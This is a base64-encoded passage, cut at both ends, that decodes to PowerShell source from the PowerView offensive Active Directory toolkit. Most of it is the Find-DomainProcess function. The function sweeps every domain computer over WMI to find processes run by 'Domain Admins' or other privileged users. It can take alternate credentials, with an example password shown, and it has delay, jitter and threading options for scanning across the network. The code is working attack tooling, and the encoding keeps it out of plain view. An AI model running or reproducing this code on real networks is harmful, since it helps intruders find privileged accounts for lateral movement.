dXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtRG9tYWluUHJvY2VzcyB7CjwjCi5TWU5PUFNJUwoKU2VhcmNoZXMgZm9yIHByb2Nlc3NlcyBvbiB0aGUgZG9tYWluIHVzaW5nIFdNSSwgcmV0dXJuaW5nIHByb2Nlc3Nlcwp0aGF0IG1hdGNoIGEgcGFydGljdWxhciB1c2VyIHNwZWNpZmljYXRpb24gb3IgcHJvY2VzcyBuYW1lLgoKVGhhbmtzIHRvIEBwYXVsYnJhbmRhdSBmb3IgdGhlIGFwcHJvYWNoIGlkZWEuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Db21wdXRlciwgR2V0LURvbWFpblVzZXIsIEdldC1Eb21haW5Hcm91cE1lbWJlciwgR2V0LVdNSVByb2Nlc3MsIE5ldy1UaHJlYWRlZEZ1bmN0aW9uICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBlbnVtZXJhdGVzIGFsbCBtYWNoaW5lcyBvbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4KdXNpbmcgR2V0LURvbWFpbkNvbXB1dGVyLCBhbmQgcXVlcmllcyB0aGUgZG9tYWluIGZvciB1c2VycyBvZiBhIHNwZWNpZmllZCBncm91cAooZGVmYXVsdCAnRG9tYWluIEFkbWlucycpIHdpdGggR2V0LURvbWFpbkdyb3VwTWVtYmVyLiBUaGVuIGZvciBlYWNoIHNlcnZlciB0aGUKZnVuY3Rpb24gZW51bWVyYXRlcyBhbnkgY3VycmVudCBwcm9jZXNzZXMgcnVubmluZyB3aXRoIEdldC1XTUlQcm9jZXNzLApzZWFyY2hpbmcgZm9yIHByb2Nlc3NlcyBydW5uaW5nIHVuZGVyIGFueSB0YXJnZXQgdXNlciBjb250ZXh0cyBvciB3aXRoIHRoZQpzcGVjaWZpZWQgLVByb2Nlc3NOYW1lLiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsIGl0IGlzIHBhc3NlZCB0aHJvdWdoIHRvCnRoZSB1bmRlcmx5aW5nIFdNSSBjb21tYW5kcyB1c2VkIHRvIGVudW1lcmF0ZSB0aGUgcmVtb3RlIG1hY2hpbmVzLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyBhbiBhcnJheSBvZiBvbmUgb3IgbW9yZSBob3N0cyB0byBlbnVtZXJhdGUsIHBhc3NhYmxlIG9uIHRoZSBwaXBlbGluZS4KSWYgLUNvbXB1dGVyTmFtZSBpcyBub3QgcGFzc2VkLCB0aGUgZGVmYXVsdCBiZWhhdmlvciBpcyB0byBlbnVtZXJhdGUgYWxsIG1hY2hpbmVzCmluIHRoZSBkb21haW4gcmV0dXJuZWQgYnkgR2V0LURvbWFpbkNvbXB1dGVyLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciBjb21wdXRlcnMgQU5EIHVzZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENvbXB1dGVyRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgY29tcHV0ZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENvbXB1dGVyTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBzZWFyY2ggZm9yIGNvbXB1dGVyIG9iamVjdHMuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgY29tcHV0ZXJzLAplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyVW5jb25zdHJhaW5lZAoKU3dpdGNoLiBTZWFyY2ggY29tcHV0ZXIgb2JqZWN0cyB0aGF0IGhhdmUgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9uLgoKLlBBUkFNRVRFUiBDb21wdXRlck9wZXJhdGluZ1N5c3RlbQoKU2VhcmNoIGNvbXB1dGVycyB3aXRoIGEgc3BlY2lmaWMgb3BlcmF0aW5nIHN5c3RlbSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlcnZpY2VQYWNrCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBzZXJ2aWNlIHBhY2ssIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTaXRlTmFtZQoKU2VhcmNoIGNvbXB1dGVycyBpbiB0aGUgc3BlY2lmaWMgQUQgU2l0ZSBuYW1lLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFByb2Nlc3NOYW1lCgpTZWFyY2ggZm9yIHByb2Nlc3NlcyB3aXRoIG9uZSBvciBtb3JlIHNwZWNpZmljIG5hbWVzLgoKLlBBUkFNRVRFUiBVc2VySWRlbnRpdHkKClNwZWNpZmllcyBvbmUgb3IgbW9yZSB1c2VyIGlkZW50aXRpZXMgdG8gc2VhcmNoIGZvci4KCi5QQVJBTUVURVIgVXNlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIHVzZXJzIHRvIHNlYXJjaCBmb3IsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgVXNlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciB0YXJnZXQgdXNlcnMuCgouUEFSQU1FVEVSIFVzZXJTZWFyY2hCYXNlCgpTcGVjaWZpZXMgdGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciB0YXJnZXQgdXNlcnMuCmUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIuIFVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgVXNlckdyb3VwSWRlbnRpdHkKClNwZWNpZmllcyBhIGdyb3VwIGlkZW50aXR5IHRvIHF1ZXJ5IGZvciB0YXJnZXQgdXNlcnMsIGRlZmF1bHRzIHRvICdEb21haW4gQWRtaW5zLgpJZiBhbnkgb3RoZXIgdXNlciBzcGVjaWZpY2F0aW9ucyBhcmUgc2V0LCB0aGVuIFVzZXJHcm91cElkZW50aXR5IGlzIGlnbm9yZWQuCgouUEFSQU1FVEVSIFVzZXJBZG1pbkNvdW50CgpTd2l0Y2guIFNlYXJjaCBmb3IgdXNlcnMgdXNlcnMgd2l0aCAnKGFkbWluQ291bnQ9MSknIChtZWFuaW5nIGFyZS93ZXJlIHByaXZpbGVnZWQpLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciBmb3IgY29tcHV0ZXJzLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluIGFuZCB0YXJnZXQgc3lzdGVtcy4KCi5QQVJBTUVURVIgU3RvcE9uU3VjY2VzcwoKU3dpdGNoLiBTdG9wIGh1bnRpbmcgYWZ0ZXIgZmluZGluZyBhZnRlciBmaW5kaW5nIGEgdGFyZ2V0IHVzZXIuCgouUEFSQU1FVEVSIERlbGF5CgpTcGVjaWZpZXMgdGhlIGRlbGF5IChpbiBzZWNvbmRzKSBiZXR3ZWVuIGVudW1lcmF0aW5nIGhvc3RzLCBkZWZhdWx0cyB0byAwLgoKLlBBUkFNRVRFUiBKaXR0ZXIKClNwZWNpZmllcyB0aGUgaml0dGVyICgwLTEuMCkgdG8gYXBwbHkgdG8gYW55IHNwZWNpZmllZCAtRGVsYXksIGRlZmF1bHRzIHRvICsvLSAwLjMKCi5QQVJBTUVURVIgVGhyZWFkcwoKVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBmb3IgdXNlciBzZWFyY2hpbmcsIGRlZmF1bHRzIHRvIDIwLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluUHJvY2VzcwoKU2VhcmNoZXMgZm9yIHByb2Nlc3NlcyBydW4gYnkgJ0RvbWFpbiBBZG1pbnMnIGJ5IGVudW1lcmF0aW5nIGV2ZXJ5IGNvbXB1dGVyIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKRmluZC1Eb21haW5Qcm9jZXNzIC1Vc2VyQWRtaW5Db3VudCAtQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0gJ1dpbmRvd3MgNyonIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwKCkVudW1lcmF0ZXMgV2luZG93cyA3IGNvbXB1dGVycyBpbiBkZXYudGVzdGxhYi5sb2NhbCBhbmQgcmV0dXJucyBhbnkgcHJvY2Vzc2VzIGJlaW5nIHJ1biBieQpwcml2aWxlZ2VkIHVzZXJzIGluIGRldi50ZXN0bGFiLmxvY2FsLgoKLkVYQU1QTEUKCkZpbmQtRG9tYWluUHJvY2VzcyAtUHJvY2Vzc05hbWUgcHV0dHkuZXhlCgpTZWFyY2hpbmdzIGZvciBpbnN0YW5jZXMgb2YgcHV0dHkuZXhlIHJ1bm5pbmcgb24gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkZpbmQtRG9tYWluUHJvY2VzcyAtRG9tYWluIHRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKClNlYXJjaGVzIHByb2Nlc3NlcyBiZWluZyBydW4gYnkgJ2RvbWFpbiBhZG1pbnMnIGluIHRoZSB0ZXN0bGFiLmxvY2FsIHVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Vc2VyUHJvY2VzcwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VQU0NyZWRlbnRpYWxUeXBlJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTQXZvaWRVc2luZ1BsYWluVGV4dEZvclBhc3N3b3JkJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Vc2VyUHJvY2VzcycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnTm9uZScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdETlNIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckRvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckxEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZWFyY2hCYXNlLAoKICAgICAgICBbQWxpYXMoJ1VuY29uc3RyYWluZWQnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRDb21wdXRlclVuY29uc3RyYWluZWQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdPcGVyYXRpbmdTeXN0ZW0nKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck9wZXJhdGluZ1N5c3RlbSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NpdGVOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTaXRlTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1RhcmdldFByb2Nlc3MnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvY2Vzc05hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdUYXJnZXRVc2VyJyldCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXJJZGVudGl0eScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VySWRlbnRpdHksCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdUYXJnZXRVc2VyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVGFyZ2V0VXNlcicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckxEQVBGaWx0ZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdUYXJnZXRVc2VyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cCcpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVXNlckdyb3VwSWRlbnRpdHkgPSAnRG9tYWluIEFkbWlucycsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdUYXJnZXRVc2VyJyldCiAgICAgICAgW0FsaWFzKCdBZG1pbkNvdW50JyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVXNlckFkbWluQ291bnQsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRTdG9wT25TdWNjZXNzLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkRGVsYXkgPSAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCgogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwKV0KICAgICAgICAkVGhyZWFkcyA9IDIwCiAgICApCgogICAgQkVHSU4gewogICAgICAgICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Ruc2hvc3RuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckRvbWFpbiddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRDb21wdXRlckRvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJMREFQRmlsdGVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRDb21wdXRlckxEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VhcmNoQmFzZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkQ29tcHV0ZXJTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVbmNvbnN0cmFpbmVkJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1VuY29uc3RyYWluZWQnXSA9ICRVbmNvbnN0cmFpbmVkIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlck9wZXJhdGluZ1N5c3RlbSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydPcGVyYXRpbmdTeXN0ZW0nXSA9ICRPcGVyYXRpbmdTeXN0ZW0gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2VydmljZVBhY2snXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmljZVBhY2snXSA9ICRTZXJ2aWNlUGFjayB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTaXRlTmFtZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTaXRlTmFtZSddID0gJFNpdGVOYW1lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJFVzZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJFVzZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRVc2VyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBZG1pbkNvdW50J10gPSAkVXNlckFkbWluQ291bnQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKCiAgICAgICAgIyBmaXJzdCwgYnVpbGQgdGhlIHNldCBvZiBjb21wdXRlcnMgdG8gZW51bWVyYXRlCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJOYW1lJ10pIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9ICRDb21wdXRlck5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLURvbWFpblByb2Nlc3NdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWluJwogICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZG5zaG9zdG5hbWUKICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogJCgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCkiCiAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoIC1lcSAwKSB7CiAgICAgICAgICAgIHRocm93ICdbRmluZC1Eb21haW5Qcm9jZXNzXSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGUnCiAgICAgICAgfQoKICAgICAgICAjIG5vdyBidWlsZCB0aGUgdXNlciB0YXJnZXQgc2V0CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc05hbWUnXSkgewogICAgICAgICAgICAkVGFyZ2V0UHJvY2Vzc05hbWUgPSBAKCkKICAgICAgICAgICAgRm9yRWFjaCAoJFQgaW4gJFByb2Nlc3NOYW1lKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0UHJvY2Vzc05hbWU